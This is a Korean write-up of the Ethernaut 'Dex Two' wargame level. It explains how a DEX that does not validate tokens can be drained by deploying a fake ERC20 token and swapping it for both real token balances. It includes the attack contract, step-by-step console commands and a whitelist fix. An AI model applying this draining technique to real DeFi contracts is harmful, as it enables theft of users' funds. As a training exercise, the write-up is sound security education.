# Ethernaut Level 23 - Dex Two

## 문제 설명

Dex와 유사하지만 토큰 유효성 검증이 없어 가짜 토큰으로 token1, token2를 모두 탈취하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract DexTwo {
    function swap(address from, address to, uint amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough");
        // ← token1/token2 여부 검증 없음!
        uint swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }
}
```

---

## 취약점 분석

### 토큰 화이트리스트 미검증

Level 21과 달리 `from`, `to`가 token1/token2인지 검증하지 않는다.

→ 가짜 ERC20 토큰을 배포해 진짜 토큰과 스왑 가능

### 공격 원리

가격 계산: `price = amount * toBalance / fromBalance`

가짜 토큰 100개를 DEX에 전송하면:
```
fakeBalance = 100, token1Balance = 100
→ 100개의 가짜 토큰으로 token1 100개 전부 스왑 가능
```

---

## 공격 컨트랙트 (가짜 토큰)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract FakeToken is ERC20 {
    constructor() ERC20("FakeToken", "FAKE") {
        _mint(msg.sender, 400);
    }
}
```

---

## 공격 단계

### Step 1 — 토큰 주소 확인

```js
let t1 = await contract.token1()
let t2 = await contract.token2()
```

### Step 2 — FakeToken 배포

Remix에서 FakeToken 배포

### Step 3 — DEX에 FakeToken 100개 전송

```js
await fakeToken.transfer(contract.address, 100)
```

### Step 4 — FakeToken으로 token1 전체 스왑

```js
// price = 100 * 100 / 100 = 100 → token1 100개 획득
await fakeToken.approve(contract.address, 100)
await contract.swap(fakeToken.address, t1, 100)
```

### Step 5 — FakeToken 200개로 token2 전체 스왑

```js
// DEX의 fakeToken = 200, token2 = 100
// price = 200 * 100 / 200 = 100 → token2 100개 획득
await fakeToken.approve(contract.address, 200)
await contract.swap(fakeToken.address, t2, 200)
```

### Step 6 — 확인

```js
await contract.balanceOf(t1, contract.address)
// → 0

await contract.balanceOf(t2, contract.address)
// → 0
```

---

## 핵심 교훈

```solidity
// ❌ 위험 - 토큰 검증 없음
function swap(address from, address to, uint amount) public { ... }

// ✅ 안전 - 화이트리스트 검증
require(
    (from == token1 && to == token2) ||
    (from == token2 && to == token1),
    "Invalid tokens"
);
```

- DEX는 반드시 허용된 토큰만 교환하도록 화이트리스트 검증 필요
- 임의의 ERC20 토큰 주소를 신뢰하면 안 됨
